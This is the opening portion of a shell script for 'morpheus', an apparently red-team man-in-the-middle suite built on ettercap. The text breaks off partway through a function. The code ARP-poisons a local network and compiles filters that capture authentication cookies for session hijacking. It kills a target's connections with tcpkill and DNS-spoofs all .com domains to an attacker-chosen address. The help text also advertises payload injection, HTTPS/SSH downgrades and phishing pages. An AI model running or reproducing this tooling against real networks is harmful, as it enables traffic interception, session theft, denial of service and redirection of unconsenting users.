#!/bin/sh
###
# morpheus - automated ettercap TCP/IP Hijacking tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.2
# Suspicious-Shell-Activity (SSA) RedTeam develop @2018
# codename: oneiroi_phobetor [ GPL licensed ]
#
#
# DESCRIPTION:
# Morpheus it's a Man-In-The-Middle suite that allows users to manipulate tcp/udp
# data using ettercap, urlsnarf, msgsnarf and tcpkill as backend applications, but...
# This tool main objective it's not to provide an easy way to exploit/sniff targets
# but ratter a 'call for attention' to tcp/udp manipulation technics (etter filters).
# "I belive that the most funny step, it will be when you write your own filter and watch it run".
#
#
# DEPENDENCIES:
# required: ettercap, nmap, zenity, apache2
# sub-dependencies: driftnet, dsniff (urlsnarf, tcpkill, msgsnarf), sslstrip,dns2proxy
# Distros Supported: Linux Ubuntu, Kali, Debian, BackBox, Parrot OS
# Credits: alor&naga (ettercap framework)  | fyodor (nmap framework)| apache2 (Rob McCool) | dsniff (Dug Song)
# filters: irongeek (replace img) | seannicholls (rotate 180º) | TheBlaCkCoDeR09 (ToR-Browser-0day)
###


###
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 37 78 > /dev/null
# inicio




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="2.2"                            # module version number
cnm="oneiroi_phobetor"               # module codename
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd`                          # grab morpheus.sh install path
GaTe=`ip route | grep "default" | awk {'print $3'}`    # gateway
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` # ip-range
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2`
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2`
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2`
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2`
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2`
ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2`
LoGmSf=`cat $IPATH/settings | egrep -m 1 "LOG_MSF" | cut -d '=' -f2`
TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2`
UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2`
MsGnA=`cat $IPATH/settings | egrep -m 1 "MSG_SNARF" | cut -d '=' -f2`
PrEfI=`cat $IPATH/settings | egrep -m 1 "PREFIX" | cut -d '=' -f2`
DrIn=`cat $IPATH/settings | egrep -m 1 "DRI_NET" | cut -d '=' -f2`
RbUdB=`cat $IPATH/settings | egrep -m 1 "REBUILD_DB" | cut -d '=' -f2`
IPH_UA=`cat $IPATH/settings | egrep -m 1 "IPHONE_USERAGENT" | cut -d '=' -f2`
LUA_PATH=`cat $IPATH/settings | egrep -m 1 "LIB_PATH" | cut -d '=' -f2`




Colors;
cat << !

    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
echo "${RedF}    Morpheus${white}©::${RedF}v$V3R${white}::${RedF}codename${white}::${RedF}oneiroi_phobetor${white}::${RedF}SuspiciousShellActivity${white}©"
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    |${YellowF}Morpheus its a Man-In-The-Middle (mitm) suite that allows users to ${BlueF}|"
echo "${BlueF}    |${YellowF}manipulate tcp/udp data using ettercap, urlsnarf, msgsnarf, tcpkill${BlueF}|"
echo "${BlueF}    |${YellowF}as backend applications but... This tool main objective its not to ${BlueF}|"
echo "${BlueF}    |${YellowF}provide an easy way to exploit/sniff targets, but ratter a call of ${BlueF}|"
echo "${BlueF}    |${YellowF}attemption to tcp/udp manipulations technics (etter filters).      ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Press [${GreenF} ENTER ${white}] to continue${RedF}!"
read OP
# -----------------------------------------
# check if user is root
# and if dependencies are proper installed
# ----------------------------------------
if [ $(id -u) != "0" ]; then
echo ""
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
exit
fi


apc=`which ettercap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which nmap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which apache2`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} apache2 '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires apache2 to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install apache ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi





# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2018
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 270`;;
esac


# config internal framework settings
ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings...\nip addr, ip range, gateway, interface\netter.conf, etter.dns, uid/gid privileges." --percentage=0 --auto-close --width 290
if [ -e $Econ ]; then
  cp $Econ /tmp/etter.conf
  cp $IPATH/bin/etter.conf $Econ
  sleep 1
else
  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
  sleep 2
  exit
fi


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C Abort current tasks${RedF}...${Reset}"
# clean logfiles folder at exit
rm $IPATH/logs/parse
rm $IPATH/logs/lan.mop
rm $IPATH/logs/triggertwo > /dev/nul 2>&1
rm $IPATH/output/firewall.ef
rm $IPATH/output/template.ef
rm $IPATH/output/redirect.ef
rm $IPATH/output/EasterEgg.ef
rm $IPATH/output/UserAgent.ef
rm $IPATH/output/grab_hosts.ef
rm $IPATH/output/packet_drop.ef
rm $IPATH/output/img_replace.ef
rm $IPATH/output/sidejacking.ef
rm $IPATH/output/chat_services.ef
rm $IPATH/output/dhcp-discovery.ef
rm $IPATH/output/cryptocurrency.ef
# revert filters to default stage
mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft
mv $IPATH/filters/template.rb $IPATH/filters/template.eft
mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft
mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft
mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft
mv $IPATH/filters/grab_hosts.rb $IPATH/filters/grab_hosts.eft
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft
mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft
mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft
mv $IPATH/filters/chat_services.rb $IPATH/filters/chat_services.eft
mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft
mv $IPATH/filters/dhcp-discovery.bak $IPATH/filters/dhcp-discovery.eft
mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html
rm -r $IPATH/logs/capture
rm $ApachE/index.html
rm $ApachE/cssbanner.js
rm -R $ApachE/"Google Sphere_files"
mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns
# revert ettercap conf files to default stage
if [ -e $Edns ]; then
mv /tmp/etter.dns $Edns
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.dns ${Reset};
fi
if [ -e $Econ ]; then
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
mv /tmp/etter.conf $Econ
fi
sleep 2
exit
}




#
#
# START OF SCRIPT FUNTIONS
#
#
# ----------------------------------------
# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
# ----------------------------------------
sh_stage1 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb
  sleep 1

  echo ${BlueF}[☠]${white} Edit firewall.eft${RedF}!${Reset};
  sleep 1
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270)
fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270)


  cd $IPATH/filters
  ed=`hostname`
  echo "$ed"7 > /tmp/test
  hOstNaMe=`cat /tmp/test`
  dIsd=`uname -r`
  # replace values in template.filter with sed bash command
  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
  sed -i "s|TaRTWO|$fil_two|g" firewall.eft
  sed -i "s|hOst|$hOstNaMe|g" firewall.eft
  sed -i "s|MoDeM|$GaTe|g" firewall.eft
  sed -i "s|DisTr|$dIsd|g" firewall.eft
  rm /tmp/test
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
        fi
      fi

  # check if exist any reports
  dd=`ls $IPATH/logs`
  if ! [ -z "$dd" ]; then
  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/firewall.ef
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# SIDEJACKING ATTACK (HTTP) STEAL COOKIES
# -------------------------------------------
sh_stage2 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will display port 80(http) and port 443(https)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
echo "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'Also this module allow users to input a cookie name to filter' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

# get user input to build filter
rm $IPATH/logs/sidejacking.log
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb
  sleep 1

  echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
  sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270)
  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through morpheus." --entry --width 270)
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T --visual text -Q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
        fi
      fi


  cd $IPATH/logs
  # delete utf-8/non-ancii caracters from tcp data captured
  tr -cd '\11\12\15\40-\176' < sidejacking.log > clean-file.log
  mv clean-file.log sidejacking.log
  # store captured data (cookies) into one variable
  fdd=`cat $IPATH/logs/sidejacking.log`
  # check if variable its 'empty'
  if ! [ -z "$fdd" ]; then
  echo ""
  # print captured data (cookies captured list)
  echo "${white}Host:${YellowF} $fil_one ${white}cookies report${RedF}!"
  echo "$fdd"
  echo ""
  # warn users that we have data stored into a logfile
  Qu=$(zenity --info --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
  fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/sidejacking.ef
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
# -------------------------------------------
sh_stage3 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} 'This module uses etter filters and tcpkill to kill connections' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then

ch=`which tcpkill`
if [ "$ch" != "$TcPkiL" ]; then
echo ${RedF}[x]${white} tcpkill utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb
  sleep 1

  echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270)
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/packet_drop.ef
  cd $IPATH
  # stop background running proccess
  # sudo pkill ettercap
  # sudo pkill tcpkill

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------
# REDIRECT TARGET TRAFIC TO ANOTHER IP ADDR
# -----------------------------------------
sh_stage4 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will ask user to input an domain name to redirect  ${BlueF}|"
echo "${BlueF}    | ${YellowF}     all browser surfing in target to the selected domain.        ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the spoof addr'      ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270)
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: 31.192.120.44\nWARNING: next value must be decimal..." --entry --width 270)

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup
  cp $Edns /tmp/etter.dns # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns
  cp $IPATH/bin/etter.dns $Edns
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft
  cd $IPATH
  sleep 1

# compiling redirect.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270
  rm $IPATH/output/redirect.ef
  mv /tmp/etter.dns $Edns
